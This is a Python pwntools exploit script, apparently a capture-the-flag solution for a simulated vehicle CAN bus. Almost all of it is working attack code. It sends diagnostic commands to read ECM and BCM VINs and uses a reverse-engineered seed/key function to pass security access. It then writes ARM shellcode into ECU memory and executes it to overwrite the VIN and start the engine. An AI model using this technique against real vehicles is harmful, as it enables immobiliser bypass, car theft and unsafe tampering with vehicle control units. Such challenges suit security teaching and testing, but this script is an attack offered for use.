from pwn import *
import binascii
context.endianness = 'big'
context.arch = "arm"

# io = process(["python3","sds_software.py"],stdin=PIPE,stdout=PIPE)

io = remote("127.0.0.1",5000)

def enter_diagnostic():
    io.sendlineafter(b"> ",b"cansend 7e0#022002")

def read_mem_by_address(addr,length):
    cmd = b"\x07\x23"
    cmd += p32(addr)
    cmd += p16(length)
    cmd = binascii.hexlify(cmd)
    io.sendlineafter(b"> ",b"cansend 7e0#"+cmd)

def _continue():
    io.sendlineafter(b"> ",b"cansend 7e0#30")

def req_security_access():
    clear()
    io.sendlineafter(b"> ",b"cansend 7e0#022201")

def clear():
    io.sendlineafter(b"> ",b"candump clear")

def candump():
    io.sendlineafter(b"> ",b"candump")


def read_did_by_id(id):
    cmd = b"\x02\x24"
    cmd += p8(id)
    cmd = binascii.hexlify(cmd)
    io.sendlineafter(b"> ",b"cansend 7e0#"+cmd)

def read_multi():
    d = io.readuntil(b"\n\n").strip(b"\n").split(b"\n")
    res  = b""
    res += binascii.unhexlify(d[0].strip()[19:].replace(b" ",b""))
    for x in d[2:]:
        res += binascii.unhexlify(x.strip()[16:].replace(b" ",b""))
    return res

def do_security_access(key):
    cmd = b"\x06\x22\x02"
    cmd += key
    cmd = binascii.hexlify(cmd)
    io.sendlineafter(b"> ",b"cansend 7e0#"+cmd)

def gen_key(seed):
    seed = list(seed)
    thing = list(b"GANG")
    KEY=list(b"RONDO")
    total=0
    for i in range(4):
        j=0
        while j<thing[i]:
            x = (seed[i]*KEY[i])%256
            if x == 0:
                KEY[i] = 0x44
            else:
                KEY[i] = x
            j+=1
        total += KEY[i]
    KEY[4] = (total%256)
    return bytes(KEY)

def write_data(addr,data,execute=False):
    #request data
    cmd = b"\x03\x26"
    cmd += p16(len(data))
    cmd = binascii.hexlify(cmd)
    io.sendlineafter(b"> ",b"cansend 7e0#"+cmd)
    
    cmd = b"\x07\x27"
    if execute:
        cmd += b"\x80"
    else:
        cmd += b"\x00"
    cmd += p32(addr)
    cmd += p8(data[0])
    cmd = binascii.hexlify(cmd)
    io.sendlineafter(b"> ",b"cansend 7e0#"+cmd)
    idx = 1
    i =1 
    while i<len(data):
        cmd = p8(0x20+idx)
        cmd += data[i:i+7]
        cmd = cmd.ljust(8,b"\x00")
        cmd = binascii.hexlify(cmd)
        io.sendlineafter(b"> ",b"cansend 7e0#"+cmd)
        i+=7
        if idx==0xf:
            idx=1

io.sendlineafter(b"> ",b"start_engine")
print(io.readline().decode())

# get ECM VIN
enter_diagnostic()
clear()
read_did_by_id(3)
_continue()
candump()
io.readline()
did_val = read_multi()
print("ECM VIN:",did_val)

# get BCM VIN
clear()
io.sendlineafter(b"> ",b"cansend 7c0#022403")
io.sendlineafter(b"> ",b"cansend 7c0#30")
candump()
io.readline()
bcm_vin = read_multi()
print("BCM VIN:",bcm_vin)

clear()
"""
DUMP SEED/KEY ALGO
"""
# read_mem_by_address(0x60010e90,208)
# _continue()
# candump()
# io.readline()
# multiframe_data = read_multi()
# with open("code.bin","wb") as f:
#     f.write(multiframe_data)

req_security_access()
candump()
io.readline()
seed = binascii.unhexlify(io.readline().strip()[19:].replace(b" ",b""))[:5]
print("SEED: ",binascii.hexlify(seed))
key = gen_key(seed)
print("KEY: ",binascii.hexlify(key))
do_security_access(key)

#enter device control mode
io.sendlineafter(b"> ",b"cansend 7e0#022003")

#programmer mode
io.sendlineafter(b"> ",b"cansend 7e0#0125")
#store new vin
write_data(0x70000090,bcm_vin)
memcpy_addr = 0x600115bc
VIN_ADDR = 0x61000098
_return = 0x60010983
context.endianness="little"
shellcode = asm("""
    movw r4,0x15bc
    movt r4,0x6001
    movw r0,0x0098
    movt r0,0x6100
    movw r1,0x0090
    movt r1,0x7000
    blx r4
    movw r4,0x0983
    movt r4,0x6001
    bx r4
""")
context.endianness="big"
print("SHELLCODE:",shellcode)
write_data(0x70000020,shellcode,execute=True)

enter_diagnostic()
clear()
read_did_by_id(3)
_continue()
candump()
io.readline()
did_val = read_multi()
print("NEW ECM VIN:",did_val)

io.sendlineafter(b"> ",b"start_engine")

io.interactive()